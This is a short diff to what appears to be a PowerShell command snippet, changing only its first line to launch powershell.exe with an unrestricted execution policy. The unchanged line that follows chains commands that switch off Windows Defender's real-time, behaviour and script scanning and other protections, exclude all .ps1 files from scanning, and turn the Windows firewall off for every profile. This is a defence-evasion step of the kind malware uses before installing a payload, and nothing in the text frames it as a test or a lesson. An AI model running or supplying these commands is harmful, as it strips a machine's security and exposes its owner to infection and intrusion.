@@ -1,4 +1,4 @@
--NoProfile -NonInteractive -ExecutionPolicy Unrestricted
+powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Unrestricted
 
 Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableBlockAtFirstSeen $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisablePrivacyMode $true; Set-MpPreference -DisableScriptScanning $true; Set-MpPreference -EnableControlledFolderAccess Disabled; Add-MpPreference -ExclusionExtension ps1 -Force; Set-ExecutionPolicy unrestricted -Force; netsh advfirewall set allprofiles state off
 
